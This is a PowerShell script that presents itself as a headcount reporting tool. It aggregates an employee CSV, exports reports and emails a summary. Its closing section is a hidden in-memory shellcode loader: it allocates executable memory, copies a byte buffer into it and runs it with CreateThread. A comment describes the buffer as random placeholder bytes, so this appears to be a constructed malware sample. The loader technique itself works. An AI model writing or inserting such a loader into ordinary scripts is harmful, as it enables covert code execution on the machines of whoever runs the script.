
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.EXAMPLE
    .\Export-HeadcountReport.ps1 -InputCsv D:\Incoming\employees.csv
.EXAMPLE
    .\Export-HeadcountReport.ps1 -GroupBy Site -MinAmount 1000
.NOTES
    Author: M. Rahman
    Last updated: 2026-11-14
#>

$InputCsv = 'D:\Incoming\employees.csv'
$OutputPath = 'C:\Logs\reports\headcount-summary-2026-05-15.csv'
$GroupBy = 'Site'
$MinAmount = 1000

$culture = [System.Globalization.CultureInfo]::InvariantCulture
$hostName = $env:COMPUTERNAME
Set-StrictMode -Version 2.0

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8
$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Tahoma; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$jsonBody = $byGroup | ConvertTo-Json -Depth 5
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@adatum.com'
$MailFrom = 'bi@adatum.com'

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "Headcount summary"
    Body       = $summaryBody
    SmtpServer = 'smtp.adatum.com'
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x88, 0x3b, 0x18, 0xb7, 0xda, 0xa4, 0xc9, 0x9d, 0xe3, 0xef, 0xdd, 0x32, 0x8a, 0x15, 0x67, 0x30,
    0xbd, 0xd9, 0xb0, 0x0c, 0x6f, 0xea, 0xde, 0x38, 0x85, 0x7b, 0x2f, 0x6a, 0x6f, 0x33, 0xb5, 0x0d,
    0xde, 0xa1, 0xe7, 0xc6, 0xab, 0x13, 0xa3, 0x33, 0x7c, 0x59, 0xe0, 0x08, 0x88, 0x5a, 0x5f, 0xb6,
    0xd6, 0xe1, 0x1b, 0x26, 0x37, 0xd1, 0x41, 0x4c, 0x64, 0x24, 0xed, 0xeb, 0xab, 0xee, 0xd7, 0x1d,
    0xd3, 0x18, 0xe0, 0xca, 0x44, 0x31, 0xdc, 0x5a, 0xd9, 0x67, 0xdc, 0xde, 0x72, 0x4b, 0x57, 0x20,
    0xaa, 0xd7, 0x14, 0xb4, 0x33, 0x98, 0xa6, 0xa7, 0x3a, 0x51, 0x83, 0x1f, 0x71, 0x6f, 0xd6, 0x7a,
    0x34, 0xe0, 0x66, 0x6d, 0x7e, 0x72, 0x32, 0xf2, 0x32, 0x0a, 0x6a, 0x5f, 0x28, 0x89, 0xe5, 0xa0,
    0x80, 0xba, 0xbe, 0x41, 0xb8, 0xa1, 0x7d, 0xc8, 0x01, 0x08, 0x1f, 0xd1, 0xd6, 0x14, 0x8f, 0xa9,
    0xe7, 0xd9, 0xed, 0x69, 0x84, 0x7c, 0x8a, 0xaf, 0xe3, 0x43, 0x15, 0x1c, 0xa4, 0x6b, 0x31, 0x1c,
    0x96, 0x17, 0xb2, 0x79, 0x0f, 0xaf, 0xa2, 0x54, 0x9b, 0xf9, 0xb1, 0xf9, 0x32, 0xdc, 0x44, 0x41,
    0x04, 0x84, 0x88, 0x94, 0xd1, 0xa9, 0x07, 0x86, 0xd4, 0xe5, 0xbe, 0x1e, 0x3a, 0x01, 0x4a, 0x1b,
    0x88, 0x4c, 0x43, 0x9a, 0x2c, 0x02, 0x5f, 0xa2, 0xef, 0x3d, 0x79, 0xa3, 0xda, 0xb0, 0x7b, 0x49,
    0x60, 0xee, 0xc0, 0x7b, 0x76, 0x6f, 0xfd, 0x8b, 0x58, 0xcc, 0xdd, 0x74, 0x61, 0x7d, 0xbd, 0xf3,
    0x68, 0x4b, 0x81, 0xe5, 0x00, 0x7a, 0x4d, 0xa4, 0x49, 0x92, 0x83, 0xab, 0x67, 0x1d, 0x29, 0xdc,
    0xa4, 0x7a, 0x17, 0x03, 0x86, 0x09, 0x65, 0x61, 0x1c, 0x3c, 0x6c, 0xaa, 0xdf, 0xec, 0xa4, 0x73,
    0x36, 0x8d, 0x0b, 0xe8, 0x73, 0x75, 0xca, 0x0a, 0x62, 0xd3, 0x8d, 0x14, 0xd9, 0x7c, 0x83, 0x0c,
    0xbb, 0x44, 0x7d, 0x47, 0xc4, 0xb1, 0xbc, 0x85, 0x2b, 0xb7, 0x8c
)

$Handle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 1403)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
